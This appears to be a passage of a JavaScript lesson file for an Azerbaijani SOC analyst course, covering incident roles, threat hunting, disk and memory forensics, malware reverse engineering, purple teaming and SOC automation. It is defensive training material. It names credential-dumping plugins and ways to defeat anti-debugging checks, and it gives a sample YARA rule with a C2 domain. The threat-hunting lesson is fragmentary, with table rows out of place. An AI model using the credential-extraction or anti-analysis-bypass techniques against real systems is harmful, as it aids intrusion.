<div class="note">Phishing müsahibə ssenarisi çox yayılıb: "İstifadəçi phishing report etdi — addımların nələrdir?" Yuxarıdakı 4 mərhələni (analiz → scope → containment → sənədləşdirmə) struktur kimi söylə. "URL-i real brauzerdə açmaram, sandbox/urlscan istifadə edərəm" demək güclü siqnaldır.</div>`},
{ title: "İnsident koordinasiyası və kommunikasiya", html: R`
<h3>İnsident rolları</h3>
<ul><li><b>Incident Commander (IC):</b> insidenti idarə edir, qərar verir, koordinasiya</li>
<li><b>Analyst/Investigator:</b> texniki təhqiqat (sən)</li><li><b>Scribe:</b> timeline/qeydləri saxlayır</li>
<li><b>Communications:</b> daxili/xarici kommunikasiya</li><li><b>SME-lər:</b> sistem sahibləri, şəbəkə, hüquq</li></ul>
<h3>Kommunikasiya prinsipləri</h3>
<ul><li><b>Faktları rəydən ayır,</b> etibarlılıq səviyyəsini göstər</li>
<li><b>Ehtiyatlı kanallar:</b> hücumçu daxili sistemdə ola bilər — kompromis ola biləcək kanallarda (adi email) həssas məlumat müzakirə etmə (out-of-band)</li>
<li><b>Vaxtında, qısa, dəqiq statuslar</b></li><li><b>Need-to-know:</b> məlumatı yalnız lazım olanlarla paylaş</li></ul>
<h3>Hüquqi və tənzimləyici (compliance)</h3>
<ul><li><b>Data breach bildirişi:</b> bir çox qanun (GDPR, yerli qanunlar) müəyyən müddətdə bildiriş tələb edir (GDPR-da 72 saat)</li>
<li><b>Dəlil bütövlüyü (chain of custody)</b> — hüquqi proses üçün</li>
<li>Standartlar: <b>ISO 27001</b> (ISMS), <b>NIST CSF</b> (Identify, Protect, Detect, Respond, Recover), <b>PCI-DSS</b> (kart), <b>SOC 2</b>, <b>HIPAA</b> (sağlamlıq)</li></ul>
<h3>Post-incident (lessons learned)</h3>
<p>Blame-free (günahlandırmayan) retrospektiv: nə baş verdi, necə aşkarladıq, nə yaxşı getdi, nə pis, nəyi yaxşılaşdırmalı (detection, proses, hardening). "Blameless postmortem" mədəniyyəti öyrənməni təşviq edir. Nəticələr konkret tədbirlərə (action items) çevrilir.</p>`},
{ title: "L2-dən L3-ə: böyümə yolu və threat hunting-ə giriş", html: R`
<h3>L2-də möhkəmlənmək</h3>
<ul><li>Hər insident növü üçün playbook-u rahat icra et</li><li>AD/Linux/web/malware/network təhqiqatında dərinləş</li>
<li>Öz detection qaydalarını yaz və tune et</li><li>Kiçik insidentləri müstəqil idarə et, L1-ə mentorluq et</li>
<li>Bir SIEM-də (Splunk/Sentinel) güvənli sorğu yaz</li><li>Scripting öyrən (Python/PowerShell — avtomatlaşdırma, parsing)</li></ul>
<h3>Threat Hunting-ə giriş (L3-ün əsası)</h3>
<p>Alert gözləmək əvəzinə <b>proaktiv</b> təhdid axtarmaq. Fərziyyə-əsaslı: "Əgər hücumçu X texnikasını işlətsəydi, bizdə belə iz olardı — var mı?"</p>
<ul><li><b>Fərziyyə mənbələri:</b> TI (yeni TTP), ATT&CK, böyük insident sonrası, "crown jewels"</li>
<li><b>Metodlar:</b> stacking (nadir dəyərlər — long tail), baseline-dən kənarlaşma, IOA axtarışı, data aqreqasiyası</li>
<li><b>Nəticə:</b> ya təhdid tapırsan (→ IR), ya da yeni detection qaydası yaradırsan (boşluğu bağla), ya da görünürlük boşluğunu aşkarlayırsan</li></ul>
<h3>Scripting — L2/L3 üçün vacib</h3>
<p>Python (log parsing, API, avtomatlaşdırma, pandas ilə data analizi) və PowerShell (Windows təhqiqat, AD) öyrən. Nümunə: minlərlə log sətrini əl ilə yox, skriptlə təhlil et; VT/AbuseIPDB API ilə kütləvi IOC yoxlaması; pcap-dan IOC çıxarma.</p>
<div class="tip">L3-ə keçid üçün: DFIR (disk/yaddaş forensikası), reverse engineering, threat hunting, detection engineering sahələrindən birində dərinləş. Sertifikatlar: BTL2, GCIH, GCFA, GNFA, GREM (RE), eCTHPv2 (hunting). "Resurslar" bölməsinə bax.</div>
<h3>Təbriklər!</h3>
<p>L2-ni başa vurmaqla sən artıq müstəqil təhqiqat apara, insidentlərə cavab verə və detection yarada bilən analitiksən. L3 modulları threat hunting, forensika və qabaqcıl mövzuları əhatə edir.</p>`}
],

lessons: [
{ title: "Threat hunting fəlsəfəsi və növləri", html: R`
<p><b>Threat hunting</b> — mövcud detection-ın buraxdığı təhdidləri <b>proaktiv</b>, insan-aparıcı axtarışla tapmaqdır. Fərziyyə: "mühitimizdə artıq aşkarlanmamış kompromis var — gəl tapaq".</p>
<h3>Niyə lazımdır?</h3>
<ul><li>Dwell time (hücumçunun aşkarlanmamış qaldığı müddət) çox vaxt həftələr/aylardır</li>
<li>Avtomatik detection yalnız bildiyini tutur (naməlum/fileless/yeni TTP-ni buraxır)</li>
<li>Hunting görünürlük boşluqlarını və yeni detection imkanlarını aşkarlayır</li></ul>
<h3>Hunting növləri</h3>
<table><tr><th>Növ</th><th>Təsvir</th></tr>
<tr><td><b>Hypothesis-driven</b></td><td>Fərziyyə qur, test et (ATT&CK/TI əsaslı)</td></tr>
<tr><td><b>IOC/IOA-driven</b></td><td>Məlum göstərici/davranışı mühitdə axtar</td></tr>
<tr><td><b>Baseline/anomaly</b></td><td>Normalı müəyyən et, kənarlaşmanı tap</td></tr>
<tr><td><b>Model/ML-assisted</b></td><td>Statistik/ML ilə anomaliya</td></tr></table>
<h3>Hunting Maturity Model (Sqrrl)</h3>
<p>HM0 (yalnız avtomatik alert) → HM1 (TI IOC axtarışı) → HM2 (prosedurları izləyir) → HM3 (yeni prosedurlar yaradır) → HM4 (avtomatlaşdırılmış hunting).</p>
<h3>PEAK / hunting loop</h3>
<ol><li><b>Prepare:</b> fərziyyə, scope, data mənbələri</li><li><b>Execute:</b> data topla, təhlil et</li>
<li><b>Act:</b> tapıntı → IR / yeni detection / yeni fərziyyə</li></ol>
<div class="note"><b>Hunting-in çıxışları (hamısı qiymətlidir):</b> (1) aktiv təhdid tapıldı → IR; (2) heç nə tapılmadı, amma yeni detection qaydası yarandı; (3) görünürlük boşluğu aşkarlandı (logging artırılmalı); (4) baseline/mühit biliyi artdı. "Heç nə tapmadım" uğursuzluq deyil.</div>`},
{ title: "Hunting metodologiyası və data analizi", html: R`
<h3>Yaxşı fərziyyə qurmaq</h3>
<p>Spesifik, test edilə bilən, ATT&CK-ə bağlı olmalıdır.</p>
<ul><li>Zəif: "bəlkə malware var"</li>
<li>Güclü: "Hücumçu T1053.005 (scheduled task) ilə persistence qurubsa, qeyri-standart yollardan işləyən və ya qeyri-iş saatında yaradılmış tapşırıqlar olmalıdır — 4698 və TaskScheduler loglarında axtar"</li></ul>
<h3>Data analiz texnikaları</h3>
<table><tr><th>Texnika</th><th>Təsvir</th></tr>
<tr><td><b>Stacking / frequency analysis</b></td><td>Dəyərləri qrupla, nadir olanları (long tail) tap. Məs: nadir rast gəlinən parent-child cütləri, nadir imzalanmamış binary-lər</td></tr>

<p>Zəngin endpoint telemetriyası (EDR/Sysmon — proses, şəbəkə, fayl, registry), DNS logları, proxy, auth logları, şəbəkə metadata (Zeek), cloud audit logları. <b>Görünürlük olmadan hunting mümkün deyil</b> — ona görə data mənbələrinin keyfiyyəti kritikdir.</p>

<tr><td>Masquerading (T1036)</td><td>System proses adları System32-dən kənarda; imzalanmamış "sistem" faylları</td></tr>

<h3>Hunting iş axını nümunəsi (beacon)</h3>

{ t: "Threat hunting lab (praktika)", d: R`<p>Hunting bacarığını inkişaf etdir.</p>`, steps: ["TryHackMe 'Threat Hunting' / 'Hunt Me' otaqları və ya BOTS (Boss of the SOC) datasetini seç", "Splunk/Elastic-də stacking məşq et: nadir parent-child proses cütlərini tap", "Python + pandas ilə nümunə proxy logundan beacon delta analizi yaz", "RITA və ya Zeek nümunə pcap ilə beacon hunting sına", "Bir ATT&CK texnikası seç, fərziyyə qur, öz labında emulate et (Atomic), sonra ovla", "Hunt-u tam sənədləşdir (fərziyyə → metod → tapıntı → nəticə)"], sol: "Threat hunting senior SOC/blue team rolunun əsasıdır. Python data analizi + ATT&CK dərin biliyi + yaxşı sənədləşdirmə bu sahədə fərqləndirici bacarıqlardır." }
]

{
id: "l3-dfir", level: "L3", title: "DFIR: Disk və yaddaş forensikası",
intro: "Digital Forensics & Incident Response. Dəlil toplama, disk/yaddaş forensikası, timeline və artefaktlar.",
lessons: [
{ title: "Forensika prinsipləri və dəlil toplama", html: R`
<h3>Əsas prinsiplər</h3>
<ul><li><b>Order of Volatility</b> (dəyişkənlik sırası) — ən tez itən dəlili əvvəl topla: registrlər/keş → RAM → şəbəkə vəziyyəti → işləyən proseslər → disk → arxiv/backup. RAM söndürüləndə itir, ona görə canlı sistemdə əvvəl yaddaş.</li>
<li><b>Chain of Custody</b> — dəlilin kim, nə vaxt, necə toplandığı/saxlandığı sənədləşdirilir (hüquqi etibar).</li>
<li><b>Integrity</b> — dəlil toplananda hash alınır, dəyişməz saxlanır. Orijinalla deyil, <b>surətlə</b> işləyirsən (write-blocker).</li>
<li><b>Reproducibility</b> — nəticələr təkrarlana bilən olmalıdır.</li></ul>
<h3>Dəlil növləri</h3>
<ul><li><b>Volatile:</b> RAM, işləyən proseslər, şəbəkə bağlantıları, açıq fayllar</li>
<li><b>Non-volatile:</b> disk образları, loglar, registry, faylların metadata-sı</li></ul>
<h3>İmaging (surət alma)</h3>
<ul><li><b>Disk:</b> dd, FTK Imager, Guymager → bit-bit surət (E01/raw). Write-blocker istifadə et (orijinalı dəyişməmək üçün).</li>
<li><b>RAM:</b> WinPmem, DumpIt, FTK Imager (Windows); LiME, avml (Linux) → yaddaş dump-u</li>
<li>Hər surət üçün hash (MD5+SHA256) al və sənədləşdir.</li></ul>
<div class="warn">Canlı kompromis sistemdə sən artefaktları dəyişdirə bilərsən (Locard prinsipi — hər təmas iz qoyur). Mümkünsə triage alətlərini xarici mediadan işlət, nəyə toxunduğunu qeyd et. Ransomware/hüquqi işlərdə forensik dəqiqlik kritikdir.</div>`},
{ title: "Yaddaş (memory) forensikası", html: R`
<p>RAM dump-u işləyən sistemin "anlıq şəkli"dir — fileless malware, şifrələnməmiş açarlar, inject olunmuş kod, şəbəkə bağlantıları, process-lər burada görünür. Alət: <b>Volatility</b> (2/3) və ya MemProcFS.</p>
<h3>Volatility 3 əsas plugin-ləri</h3>
<table><tr><th>Plugin</th><th>Nə göstərir</th></tr>
<tr><td>windows.pslist / pstree</td><td>İşləyən proseslər / ağac</td></tr>
<tr><td>windows.psscan</td><td>Gizlədilmiş/çıxmış proseslər (DKOM)</td></tr>
<tr><td>windows.cmdline</td><td>Proseslərin əmr sətirləri</td></tr>
<tr><td>windows.netscan / netstat</td><td>Şəbəkə bağlantıları</td></tr>
<tr><td>windows.dlllist / ldrmodules</td><td>Yüklənmiş DLL-lər (inject aşkarlama)</td></tr>
<tr><td>windows.malfind</td><td>İnject olunmuş/şübhəli yaddaş sahələri (RWX)</td></tr>
<tr><td>windows.handles</td><td>Açıq handle-lar (fayl, mutex)</td></tr>
<tr><td>windows.hashdump / lsadump</td><td>Credential-lar</td></tr>
<tr><td>windows.registry.*</td><td>Yaddaşdakı registry</td></tr>
<tr><td>windows.filescan / dumpfiles</td><td>Yaddaşdakı fayllar</td></tr></table>
<h3>Yaddaş forensikası iş axını</h3>
<ol><li>Proses siyahısı (pslist vs psscan — fərq = gizlətmə)</li><li>Şübhəli proseslər (qeyri-adi ad/parent/yol)</li>
<li>Əmr sətirləri (cmdline)</li><li>Şəbəkə bağlantıları (netscan — C2)</li>
<li>Injection (malfind — RWX sahələr, shellcode)</li><li>Şübhəli DLL-lər</li><li>Credential/registry çıxar</li>
<li>Şübhəli proses yaddaşını dump et → statik analiz</li></ol>
<div class="tip">malfind — injection aşkarlamaq üçün ən güclü plugin: icra icazəli (RWX) anonim yaddaş sahələrini tapır, bunlar çox vaxt shellcode/inject olunmuş koddur. pslist (linked list) ilə psscan (pool scan) fərqi gizlədilmiş prosesi üzə çıxarır.</div>`},
{ title: "Disk forensikası və Windows artefaktları", html: R`
<p>Disk forensikası faylları, silinmiş məlumatı və fəaliyyət izlərini (artefaktları) bərpa edir. Alətlər: <b>Autopsy/Sleuth Kit</b> (pulsuz), FTK, X-Ways, EnCase, <b>plaso/log2timeline</b> (super timeline).</p>
<h3>Vacib Windows forensik artefaktları</h3>
<table><tr><th>Artefakt</th><th>Nə göstərir</th></tr>
<tr><td>$MFT (NTFS)</td><td>Bütün fayllar + MAC(B) vaxtları</td></tr>
<tr><td>Registry (SAM, SYSTEM, SOFTWARE, NTUSER.DAT)</td><td>Konfiqurasiya, istifadəçi fəaliyyəti, persistence (Run açarları)</td></tr>
<tr><td><b>Prefetch</b> (C:\Windows\Prefetch)</td><td>İcra olunmuş proqramlar + neçə dəfə + son icra vaxtı (proqram işləyib!)</td></tr>
<tr><td><b>Amcache / Shimcache</b></td><td>İcra edilmiş proqramların dəlili</td></tr>
<tr><td><b>Event Logs (.evtx)</b></td><td>Logon, proses, servis və s.</td></tr>
<tr><td><b>LNK / Jump Lists</b></td><td>Açılmış fayllar</td></tr>
<tr><td><b>ShellBags</b></td><td>Baxılmış qovluqlar</td></tr>
<tr><td><b>SRUM</b></td><td>Proses şəbəkə/resurs istifadəsi (exfil həcmi)</td></tr>
<tr><td><b>USN Journal / $LogFile</b></td><td>Fayl sistemi dəyişiklikləri</td></tr>
<tr><td><b>Browser artefaktları</b></td><td>Tarixçə, endirmələr, keş</td></tr>
<tr><td><b>Recycle Bin, Thumbcache</b></td><td>Silinmiş fayllar, şəkil izləri</td></tr>
<tr><td><b>WMI repository, Scheduled Tasks</b></td><td>Persistence</td></tr></table>
<h3>Timeline analizi</h3>
<p>Bütün artefaktların vaxt damğalarını birləşdirib (super timeline — plaso) hadisələrin ardıcıllığını qurmaq. "Nə vaxt nə oldu" — hücumun tam hekayəsi. Timeline DFIR-ın ürəyidir.</p>
<p><b>Timestomping aşkarlama:</b> $STANDARD_INFORMATION (SI) və $FILE_NAME (FN) vaxtlarının uyğunsuzluğu, sub-saniyə dəqiqliyinin "0" olması saxtalaşdırma əlamətidir.</p>`},
{ title: "Triage, KAPE və sürətli DFIR", html: R`
<p>Tam disk образı həmişə praktik deyil (vaxt, ölçü). <b>Triage collection</b> — yalnız ən dəyərli artefaktları tez toplamaq.</p>
<h3>KAPE (Kroll Artifact Parser and Extractor)</h3>
<p>Pulsuz, sürətli triage aləti: <b>Targets</b> (hansı artefaktları toplamaq) + <b>Modules</b> (onları parse etmək). Dəqiqələr içində əsas artefaktları (MFT, registry, event logs, prefetch, browser) toplayıb analiz edir. Velociraptor da fleet-wide triage üçün güclüdür.</p>
<h3>Eric Zimmerman alətləri (pulsuz, DFIR qızıl standartı)</h3>
<ul><li><b>MFTECmd</b> — $MFT parse</li><li><b>Registry Explorer / RECmd</b> — registry</li>
<li><b>PECmd</b> — Prefetch</li><li><b>EvtxECmd</b> — Event logs</li>
<li><b>Timeline Explorer</b> — CSV timeline analizi</li><li><b>JLECmd, LECmd, SBECmd, AmcacheParser</b></li></ul>
<h3>DFIR iş axını (insident)</h3>
<ol><li>Scope: hansı sistemlər təsirlənib?</li><li>Volatile topla (RAM) — kritik sistemlərdə</li>
<li>Triage topla (KAPE) — sürətli artefaktlar</li><li>Timeline qur (super timeline)</li>
<li>Root cause: ilkin giriş necə oldu? (patient zero)</li><li>Scope dəqiqləşdir: başqa harada?</li>
<li>IOC çıxar, digər sistemləri yoxla</li><li>Hesabat + remediation</li></ol>
<div class="note">Müsahibə (senior): "Kompromis olunmuş Windows host-u araşdırmaq üçün hansı artefaktlara baxarsan?" Güclü cavab: RAM (volatile) → Prefetch/Amcache (nə işləyib) → Event logs (logon/proses) → registry Run/services/tasks (persistence) → $MFT + timeline (nə vaxt) → browser/LNK (istifadəçi fəaliyyəti). Order of volatility və chain of custody-ni qeyd et.</div>`}
],

{ t: "Artefakt seçimi", d: R`<p>Bir Windows host-da 'notepad.exe hücumçu tərəfindən işlədilibmi?' sualına cavab axtarırsan (fileless/EDR yoxdur).</p>`, q: "Proqramın icra olunub-olunmadığını göstərən artefaktlardan birini yaz:", ans: ["prefetch", "amcache", "shimcache", "srum", "userassist"], hint: "Execution artefaktları.", sol: "Prefetch (ən dəqiq: neçə dəfə + son icra vaxtı), həmçinin Amcache, Shimcache, UserAssist (GUI icra), SRUM. Bu 'execution artefaktları' EDR olmasa belə proqramın işlədiyini sübut edir. PECmd ilə Prefetch parse et, Timeline Explorer-də bax. Prefetch söndürülə bilər (SSD-lərdə bəzən), ona görə bir neçə mənbəni çarpaz yoxla." },

{
id: "l3-re", level: "L3", title: "Malware Reverse Engineering (əsaslar)",
intro: "Zərərli kodu dərindən anlamaq: assembly, statik/dinamik RE, debugging, unpacking və C2 çıxarma.",
lessons: [
{ title: "RE üçün əsaslar: assembly və PE strukturu", html: R`
<p>Reverse engineering — kompilyasiya olunmuş kodu geri təhlil edib necə işlədiyini anlamaqdır. L3 üçün əsas bacarıq (xüsusən malware/detection engineering rollarında).</p>
<h3>x86/x64 assembly əsasları</h3>
<ul><li><b>Registrlər:</b> EAX/RAX (nəticə/akkumulyator), EBX, ECX (sayğac), EDX, ESI/EDI (mənbə/təyinat), ESP (stack pointer), EBP (base pointer), EIP/RIP (instruction pointer)</li>
<li><b>Əsas təlimatlar:</b> MOV (köçür), PUSH/POP (stack), CALL/RET (funksiya), JMP/JE/JNE/JZ (keçid), CMP/TEST (müqayisə), ADD/SUB/XOR, LEA</li>
<li><b>Calling conventions:</b> funksiyalara arqumentlərin necə ötürülməsi (stack/registr)</li>
<li><b>Stack:</b> LIFO; funksiya çağırışları, lokal dəyişənlər, qayıdış ünvanları</li></ul>
<h3>PE (Portable Executable) strukturu</h3>
<ul><li><b>DOS header</b> (MZ), <b>PE header</b>, <b>Optional header</b> (EntryPoint, ImageBase)</li>
<li><b>Sections:</b> .text (kod), .data (məlumat), .rdata (read-only, importlar/strings), .rsrc (resurslar), .reloc</li>
<li><b>Import Address Table (IAT)</b> — istifadə olunan API funksiyaları (niyyət göstərir)</li>
<li><b>Export Table</b> — DLL-in təqdim etdiyi funksiyalar</li></ul>
<div class="tip">Hər şeyi sətir-sətir anlamaq lazım deyil. Malware RE-də məqsəd çox vaxt: "bu nə edir, C2 haradadır, IOC-lar nələrdir, necə aşkarlayarıq?" — yüksək səviyyəli davranışı çıxarmaq. Dekompilyatorlar (Ghidra) assembly-ni C-yə bənzər koda çevirərək bunu asanlaşdırır.</div>`},
{ title: "Alətlər: Ghidra, IDA, x64dbg", html: R`
<table><tr><th>Alət</th><th>Növ</th><th>Qeyd</th></tr>
<tr><td><b>Ghidra</b></td><td>Disassembler + decompiler</td><td>Pulsuz (NSA), güclü — başlanğıc üçün ideal</td></tr>
<tr><td><b>IDA Pro / IDA Free</b></td><td>Disassembler + decompiler</td><td>Sənaye standartı (pullu; Free məhdud)</td></tr>
<tr><td><b>x64dbg / x32dbg</b></td><td>Debugger</td><td>Pulsuz, dinamik (Windows)</td></tr>
<tr><td><b>Binary Ninja, Radare2/Cutter</b></td><td>Disassembler</td><td>Alternativlər</td></tr>
<tr><td><b>dnSpy / ILSpy</b></td><td>.NET decompiler</td><td>C#/.NET malware üçün (demək olar ki, mənbə kod)</td></tr>
<tr><td><b>PEStudio, Detect It Easy (DIE)</b></td><td>PE analiz</td><td>Statik triage, packer aşkarlama</td></tr></table>
<h3>Statik RE iş axını</h3>
<ol><li>PEStudio/DIE: packer, imports, strings, entropiya</li><li>Packed-dirsə unpack et</li>
<li>Ghidra-da yüklə, entry point-dən başla</li><li>İmport olunan API-lərə görə əsas funksiyaları tap (şəbəkə, crypto, fayl)</li>
<li>String referanslarını izlə (C2 domen/URL, mutex, açarlar)</li><li>Decompiler ilə məntiqi anla</li>
<li>IOC-lar və davranışı çıxar</li></ol>
<h3>Dinamik RE / debugging</h3>
<p>x64dbg ilə malware-i addım-addım icra et: breakpoint qoy (API çağırışlarında — CreateProcess, WinHTTP, CryptEncrypt), registr/yaddaşa bax, şifrə/encoding real vaxtda açıl. Statik analiz çətin (obfuscated) olanda dinamik kömək edir.</p>`},
{ title: "Obfuscation, packing və unpacking", html: R`
<p>Malware müəllifləri analizi çətinləşdirmək üçün kodu gizlədir.</p>
<h3>Texnikalar</h3>
<ul><li><b>Packing:</b> kodu sıxışdırıb/şifrələyib runtime-da açmaq (UPX, Themida, VMProtect). Statik strings/imports gizlənir.</li>
<li><b>Obfuscation:</b> mənasız kod, string şifrələmə, control flow qarışdırma, junk təlimatlar</li>
<li><b>Anti-debugging:</b> IsDebuggerPresent, PEB yoxlaması, timing (RDTSC), int 2D/3</li>
<li><b>Anti-VM/sandbox:</b> VM artefaktları yoxlaması, sleep, istifadəçi fəaliyyəti gözləmə</li>
<li><b>API hashing:</b> API adlarını string yox, hash ilə çağırmaq (import gizlətmə)</li></ul>
<h3>Unpacking yanaşmaları</h3>
<ul><li><b>Məlum packer:</b> UPX → <code>upx -d</code>. Avtomatik unpacker-lər.</li>
<li><b>Manual:</b> x64dbg-də "OEP" (Original Entry Point)-ə qədər işlət (tail jump tap), sonra yaddaşdan dump et (Scylla ilə IAT bərpa).</li>
<li><b>Yaddaşdan çıxarma:</b> malware runtime-da öz gerçək kodunu açır — həmin anda RAM-dan dump et (yaddaş forensikası ilə də).</li></ul>
<h3>Anti-analizi aşmaq</h3>
<p>Debugger-i gizlət (ScyllaHide), VM artefaktlarını maskala, timing yoxlamalarını patch et (JMP ilə keç), API hashing-i həll et (hash → funksiya cədvəli). Bu, "pişik-siçan" oyunudur.</p>
<div class="warn">RE həmişə tam izolyasiya olunmuş labda. Dinamik analizdə malware real işləyir — şəbəkəni idarə et (INetSim/FakeNet), snapshot-dan istifadə et, host-u qoru.</div>`},
{ title: "RE-dən detection və IOC çıxarmaq", html: R`
<p>Malware RE-nin SOC məqsədi: <b>davamlı detection və IOC yaratmaq</b>.</p>
<h3>RE-dən nə çıxarırıq?</h3>
<ul><li><b>C2 infrastrukturu:</b> domen/IP/URL (hardcoded və ya DGA alqoritmi)</li>
<li><b>Konfiqurasiya:</b> malware config (açarlar, C2, kampaniya ID) — çox vaxt şifrəli, RE ilə açılır</li>
<li><b>Mutex, fayl adları, registry açarları:</b> host IOC-ları</li>
<li><b>Şifrələmə/encoding sxemi:</b> trafiki deşifrə etmək üçün</li>
<li><b>Davranış/TTP-lər:</b> necə persistence qurur, nə oğurlayır, necə yayılır</li>
<li><b>YARA imzaları:</b> unikal bayt/string nümunələri (digər nümunələri tutmaq)</li></ul>
<h3>DGA reversing</h3>
<p>Malware domen generasiya alqoritmini (DGA) RE ilə çıxarıb gələcək domenləri əvvəlcədən hesablamaq → onları bloklamaq/sinkhole etmək olar. Güclü proaktiv müdafiə.</p>
<h3>Config extraction</h3>
<p>Bir çox malware ailəsi üçün icma "config extractor"-ları var (nümunədən C2/açarları avtomatik çıxarır). RE biliyi öz extractor-unu yazmağa imkan verir.</p>
<h3>YARA qaydası yazmaq (RE-dən)</h3>
<pre>rule MALWARE_ExampleFamily {
  meta:
    description = "Example family detection"
    author = "SOC Mentor"
  strings:
    $mutex = "Global\\xZ9k_lock"
    $c2 = "c2-panel.top"
    $code = { 55 8B EC 83 EC ?? 56 57 8B 7D 08 }  // unikal funksiya başlanğıcı
  condition:
    uint16(0) == 0x5A4D and 2 of them    // MZ başlıq + 2 nümunə
}</pre>
<div class="note">Müsahibə (senior/RE): "Malware-dən nə çıxararsan?" Güclü cavab: C2 (hardcoded/DGA), config, host IOC-lar (mutex/fayl/registry), encoding sxemi, TTP-lər və bunlardan YARA/Sigma detection + bloklama. "RE-nin məqsədi təkcə anlamaq deyil, davamlı müdafiə yaratmaqdır" fikrini vurğula.</div>`}
],

{
id: "l3-leadership", level: "L3", title: "Purple Team, SOC idarəçiliyi və avtomatlaşdırma",
intro: "Senior səviyyə: purple teaming, adversary emulation, SOC metrikaları, avtomatlaşdırma, mentorluq və karyera.",
lessons: [
{ title: "Purple Teaming və Adversary Emulation", html: R`
<p><b>Purple teaming</b> — Red (hücum) və Blue (müdafiə) komandaların birgə, əməkdaşlıqlı işi: hücum texnikaları icra olunur, müdafiənin onları aşkar/bloklaya bildiyi yoxlanılır, boşluqlar düzəldilir.</p>
<h3>Adversary emulation</h3>
<p>Real təhdid aktorlarının (TTP-lərinin) ssenariyə əsaslanan təqlidi. Məqsəd: "bizim müdafiəmiz bu konkret aktora qarşı nə qədər effektivdir?"</p>
<ul><li><b>MITRE ATT&CK</b> ssenari əsası</li>
<li><b>Atomic Red Team</b> — tək texnikaların təhlükəsiz testi</li>
<li><b>CALDERA</b> (MITRE) — avtomatlaşdırılmış emulation platforması</li>
<li><b>Red Canary, Prelude, Vectr</b> — emulation/track alətləri</li>
<li><b>Caldera, Atomic</b> ilə detection validation</li></ul>
<h3>Purple team dövrü</h3>
<ol><li>Ssenari seç (ATT&CK/TI əsaslı aktor)</li><li>Red texnikanı icra edir (idarə olunan, sənədləşdirilmiş)</li>
<li>Blue aşkarlamağa çalışır (real vaxtda)</li><li>Nəticə: tutuldumu? Hansı mərhələdə? Alert yarandımı?</li>
<li>Boşluğu düzəlt (yeni detection/logging)</li><li>Təkrar test (regresiya)</li></ol>
<h3>Detection validation</h3>
<p>"Bizim detection-ımız həqiqətən işləyirmi?" sualına əmin cavab yalnız test ilə verilir. Purple team coverage-ı real, nəzəri yox, sübut edilmiş edir. ATT&CK Navigator ilə "yaşıl" (tutulur) / "qırmızı" (boşluq) texnikaları xəritələ.</p>
<div class="note">Purple team Red-ə qarşı "qalib gəlmək" deyil — <b>müdafiəni yaxşılaşdırmaq</b> məqsədi daşıyır. Ən yaxşı nəticə: hər boşluğun bağlanması. Əməkdaşlıq, rəqabət deyil.</div>`},
{ title: "SOC metrikaları, idarəçiliyi və yetkinlik", html: R`
<h3>Əsas SOC metrikaları (KPI)</h3>
<table><tr><th>Metrika</th><th>Nəyi ölçür</th></tr>
<tr><td><b>MTTD</b></td><td>Aşkarlamaya qədər orta vaxt</td></tr>
<tr><td><b>MTTR</b></td><td>Cavaba/bərpaya qədər orta vaxt</td></tr>
<tr><td><b>MTTA</b></td><td>Alertə reaksiyaya qədər orta vaxt</td></tr>
<tr><td><b>Alert həcmi / analitik</b></td><td>İş yükü, tükənmə riski</td></tr>
<tr><td><b>False positive nisbəti</b></td><td>Detection keyfiyyəti</td></tr>
<tr><td><b>Dwell time</b></td><td>Hücumçunun qalma müddəti</td></tr>
<tr><td><b>Coverage (ATT&CK)</b></td><td>Detection əhatəsi</td></tr>
<tr><td><b>Escalation accuracy</b></td><td>Eskalasiyaların düzgünlüyü</td></tr></table>
<p><b>Diqqət:</b> metrikalar düzgün istifadə olunmalıdır. "Daha çox alert bağlandı" yaxşı deyil əgər keyfiyyət aşağıdırsa. Metrikalar davranışı formalaşdırır — səhv metrika səhv davranış yaradır (məs. analitik tez bağlamaq üçün araşdırmadan close edər).</p>
<h3>SOC yetkinlik (maturity)</h3>
<p>Reaktiv (yalnız alert) → proaktiv (hunting, detection engineering) → optimallaşdırılmış (avtomatlaşdırma, threat-informed, davamlı təkmilləşmə). SOC-CMM yetkinlik modeli ilə qiymətləndirilir.</p>
<h3>Burnout və komanda sağlamlığı</h3>
<p>SOC yüksək stresli (növbə, alert fatigue, təzyiq). Senior analitik/lead burnout əlamətlərini tanımalı, iş yükünü balanslaşdırmalı, avtomatlaşdırma ilə təkrarlığı azaltmalı, komandaya mentorluq etməlidir. Yüksək kadr dövriyyəsi SOC-un əsas problemidir.</p>
<h3>Rəhbərliklə ünsiyyət</h3>
<p>Senior səviyyədə texniki detalı biznes dilinə çevirmək lazımdır: "risk nədir, biznesə təsiri nədir, nə qədər xərc/fayda?" CISO/rəhbərlik risk və resurs dilində düşünür, CVE/Event ID dilində yox.</p>`},
{ title: "Avtomatlaşdırma, SOAR və Detection-as-Code", html: R`
<h3>Niyə avtomatlaşdırma?</h3>
<p>İnsan vaxtı dəyərlidir. Təkrarlanan işləri (IOC yoxlama, FP triage, zənginləşdirmə, containment) avtomatlaşdırıb analitiki real təhlilə fokuslamaq.</p>
<h3>SOAR istifadə sahələri</h3>
<ul><li><b>Enrichment:</b> alert gələndə avtomatik IOC-ları TI/VT/AbuseIPDB-də yoxla, kontekst əlavə et</li>
<li><b>Auto-triage:</b> məlum FP nümunələrini avtomatik bağla; yüksək-etibarlı TP-ləri eskalasiya et</li>
<li><b>Response:</b> host izolyasiyası, hesab deaktiv, IP blok (insan təsdiqi ilə kritik olanlar)</li>
<li><b>Orchestration:</b> alətlər arası iş axını (SIEM → EDR → ticketing → chat)</li>
<li><b>Case management:</b> avtomatik ticket, IOC toplama</li></ul>
<h3>Scripting və API-lər</h3>
<p>Python senior SOC-un əsas dilidir: log parsing (pandas), API inteqrasiyası (SIEM, TI, EDR), avtomatlaşdırma, data analizi (hunting). PowerShell Windows/AD üçün. Nümunə: VT API ilə 1000 hash-i avtomatik yoxlayan skript; yeni IOC-ları bütün alətlərə push edən pipeline.</p>
<h3>Detection-as-Code (DaC)</h3>
<ul><li>Qaydalar Git-də (versiya, review, tarixçə)</li><li>CI/CD ilə test və deploy</li>
<li>Avtomatik test (Atomic ilə validation)</li><li>Sigma → çox SIEM-ə çevrilmə (pySigma)</li>
<li>Kod keyfiyyəti standartları (sənədləşdirmə, FP qeydləri, ATT&CK tags)</li></ul>
<div class="warn"><b>Avtomatlaşdırmada diqqət:</b> avtomatik response (host izolyasiyası, hesab blok) səhv işləsə biznesi poza bilər. Kritik tədbirlərdə "insan təsdiqi" (human-in-the-loop) saxla. Avtomatlaşdırmanı tədricən, etibar qazandıqca genişləndir.</div>`},
{ title: "Karyera, sertifikatlar və davamlı inkişaf", html: R`
<h3>Təbriklər — tam yolu keçdin!</h3>
